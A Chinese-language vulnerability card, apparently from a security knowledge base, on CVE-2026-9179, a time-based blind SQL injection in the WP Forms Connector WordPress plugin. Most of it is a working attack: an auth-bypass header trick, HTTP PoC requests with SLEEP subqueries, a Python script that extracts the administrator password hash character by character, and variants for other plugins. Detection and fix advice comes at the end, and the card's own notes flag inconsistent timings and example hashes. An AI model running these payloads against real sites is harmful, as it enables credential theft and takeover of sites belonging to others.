---
id: web-generic-sqli-wordpress-plugin-order-by-time-blind
title: WordPress 插件 ORDER BY 裸拼时间盲注：ORDER BY 子查询 SLEEP 逐字符提取管理员哈希（CVE-2026-9179）
type: scenario
domain: web
path: web/generic/sqli
technique: wordpress-plugin-order-by-time-blind
aliases:
- CVE-2026-9179 SQL 注入
- WP Forms Connector SQLi
- ORDER BY 时间盲注
- ORDER BY 子查询 SLEEP
- wp/v3/post/list 注入
- WordPress 插件 SQL 注入
tags:
- wordpress
- sqli
- time-based-blind
- order-by
- cve-2026-9179
- php
- mysql
- wpdb
cve:
- CVE-2026-9179
severity: high
confidence: high
affected_versions: WP Forms Connector 1.8（原文环境；PoC 标注 <= 1.8，暂无官方补丁）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:14:50+08:00'
  notes: 已对照原文与截图核对：order 裸拼 ORDER BY 后交 wpdb->get_results，SLEEP 子查询可控延迟；图07 PoC显示基线0.05s、SLEEP(5)5.02s并提取34字符phpass哈希，确认时间盲注与数据提取。注意原文内部不一致：图03/04 Burp计时为1053ms/16026ms，而正文与图07为0.05s/5.02s；图07实际哈希为$P$BFOAwAcy1W9gHw/S8Mafj.V17xlnUZ0，正文示例为$P$BLr6ZbOdJmOx9bRqN3Jk1sV0WyEj.y0，卡内示例沿用了正文。核心结论不受影响；INSERT/DELETE 端点未验证。
---

## 一句话结论

WP Forms Connector 的 `listPost()` 在认证（可通过缺失密码校验绕过）之后，把 `$_GET['order']` 直接拼进 `ORDER BY post_date $shorting` 并交给 `$wpdb->get_results()`，没有 `$wpdb->prepare()`；MySQL 允许 ORDER BY 后接子查询，因此攻击者可用 `(SELECT 1 FROM (SELECT IF(condition,SLEEP(n),0))x)` 做时间盲注，逐字符提取 `wp_users.user_pass` 管理员哈希，全程无需登录且无报错回显。

## 原理

- **注入点**：`$shorting = $_GET['order'];` 后拼成 `... ORDER BY $table_name.post_date $shorting LIMIT 0, $pageLimit`，直接进入 `$wpdb->get_results()`。`$wpdb->prepare()` 从未被调用，`order` 也不是值上下文而是 SQL 语法位置，预编译占位符无法覆盖。
- **为什么 ORDER BY 能注入**：SQL 的 ORDER BY 接受表达式，不止列名。MySQL 支持 `ORDER BY (SELECT ...)`，因此 `DESC,(SELECT 1 FROM (SELECT IF(1=1,SLEEP(5),0))x)` 是合法语句，SLEEP 随排序表达式求值执行。
- **为什么用时间盲注**：该查询结果只返回 `{"timezone":...,"data":[]}`，既不回显查询数据，也没有 UNION 位或报错信息；只能通过响应耗时判断条件真假。条件为真时响应约 5 秒，为假时约 0.05 秒。
- **认证前置**：插件的 `permission_callback` 为 `__return_true`，且 `listPost()` 只查管理员用户名与角色、不验密码；请求带 `Username: admin` 和任意非空 `Password` 即可到达注入点（详见关联的认证绕过卡）。
- **提取策略**：对目标字符串做二分搜索，`ASCII(SUBSTRING((SELECT user_pass FROM wp_users WHERE ID=1),pos,1)) >= mid` 作为条件；每个字符约 7 次请求，34 字符的 WordPress phpass 哈希约 120 秒可提取。也可用线性遍历/按位提取/字典优先，但稳定性与请求量不同。
- **同插件其他注入点**：文章列出 7 个公开端点，其中 4 个存在 ORDER BY 注入（`post/list`、`page/list`、`user/list`、`comment/list`），另外 `post/create`、`page/create`、`user/delete/<id>` 被文章称为 INSERT/DELETE 注入（原文未给出完整 PoC，需另行验证）。

## 触发条件

- 目标安装并启用 WP Forms Connector 1.8（或 <= 1.8），REST 路由 `/wp-json/wp/v3/...` 可达。
- 已知管理员用户名（默认 `admin`），并能带上任意非空 `Password` 头通过伪认证。
- 数据库为 MySQL（ORDER BY 子查询语法可用），且应用用户有查询 `wp_users` 的权限（WordPress 默认有）。
- 网络延迟相对稳定，便于用 SLEEP 时长判断布尔条件；本地/内网环境最可靠。

## 利用步骤

1. 先按认证绕过卡确认 `Username: admin` + 任意 `Password` 能返回 200。
2. 发送基线请求 `order=DESC&limit=1&status=publish`，记录正常耗时（示例 0.05s）。
3. 发送 `order=DESC,(SELECT 1 FROM (SELECT IF(1=1,SLEEP(5),0))x)`，若响应约 5s，确认时间盲注。
4. 用 `IF(1=0,SLEEP(5),0)` 对照，确认延迟由条件控制而非网络抖动。
5. 用二分搜索逐字符提取：先 `LENGTH((SELECT user_pass FROM wp_users WHERE ID=1))` 求长度，再对每个位置用 `ASCII(SUBSTRING(...)) >= mid` 缩小范围。
6. 得到 `$P$...` phpass 哈希后离线破解，或继续提取邮箱、其他用户哈希。
7. 对同插件其他端点重复测试，确认注入面。

## PoC

基线：

```http
GET /wp-json/wp/v3/post/list?order=DESC&limit=1&status=publish HTTP/1.1
Host: target:9982
Username: admin
Password: any
```

响应 200，耗时约 0.05s。

时间盲注确认：

```http
GET /wp-json/wp/v3/post/list?order=DESC,(SELECT%201%20FROM%20(SELECT%20IF(1=1,%20SLEEP(5),%200))x)&limit=1&status=publish HTTP/1.1
Host: target:9982
Username: admin
Password: any
```

响应 200，耗时约 5.02s（条件为真）；把 `1=1` 改为 `1=0` 应恢复约 0.05s。

二分提取单字符（Python 片段）：

```python
import requests, time

HEADERS = {"Username": "admin", "Password": "any"}
URL = "http://target:9982/wp-json/wp/v3/post/list"

def delay(condition, sleep=0.5):
    order = f"DESC,(SELECT 1 FROM (SELECT IF({condition}, SLEEP({sleep}), 0))x)"
    t = time.time()
    requests.get(URL, params={"order": order, "limit": "1", "status": "publish"},
                 headers=HEADERS, timeout=5)
    return time.time() - t

def extract_char(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        cond = f"ASCII(SUBSTRING((SELECT user_pass FROM wp_users WHERE ID=1),{pos},1)) >= {mid}"
        if delay(cond) >= 0.35:
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)

hash_len = 34  # 先用 LENGTH(...) 二分求得
print("".join(extract_char(i) for i in range(1, hash_len + 1)))
```

实测输出示例：`$P$BLr6ZbOdJmOx9bRqN3Jk1sV0WyEj.y0`（34 字符，约 105–120 秒完成）。

## 变体与关联

- 变体：`limit` 参数也被裸拼进 `LIMIT 0, $pageLimit`，同样可注入；`status` 被拼进单引号内的 `post_status = '$postStatus'`，可尝试闭合引号注入（原文以 `order` 为主）。
- 变体：同插件 `page/list`、`user/list`、`comment/list` 的 `order` 参数同样可注入；`post/create`、`page/create`、`user/delete` 据原文存在 INSERT/DELETE 注入，但未给出完整验证。
- 变体：其他 WordPress 插件中 `$_GET` 直接拼 `ORDER BY`/`LIMIT` 的写法可复用同一 payload；若目标不支持子查询，可尝试 `ORDER BY IF(condition,SLEEP(n),0)`、`BENCHMARK()` 或基于列位置的布尔盲注。
- 关联卡片：[[web-generic-auth-wordpress-rest-header-password-check-missing]]（本注入的前置认证绕过）、[[web-generic-sqli-java-identifier-table-order-by-injection]]（标识符位置注入的通用原理）。
- 边界：WAF 若阻断 `sleep`/`select`/子查询或规范化 `order` 参数会失效；数据库非 MySQL 时需调整语法；网络抖动大时二分搜索误判率上升，可增大 SLEEP 或改线性遍历。

## 检测与防御

- 检测：请求 `order` 参数中出现 `SLEEP`、`BENCHMARK`、`SELECT`、子查询、逗号后接表达式等；`/wp-json/wp/v3/*list` 端点响应时间异常（约等于 SLEEP 值）；同一 IP 对同一端点高频请求且参数递增变化。
- 修复：`order` 只允许 `ASC`/`DESC` 白名单，其他值回退默认；`limit` 用 `absint()` 并限制范围；SQL 值参数使用 `$wpdb->prepare()`，标识符位置用白名单映射；补上 `wp_check_password`，关闭 `permission_callback '__return_true'`。
- 加固：无官方补丁时卸载/禁用插件；WAF 阻断 `/wp-json/wp/v3/` 下含 SQL 关键字/函数的 `order`；限制数据库账号权限，定期轮换管理员密码并破解自查弱口令。
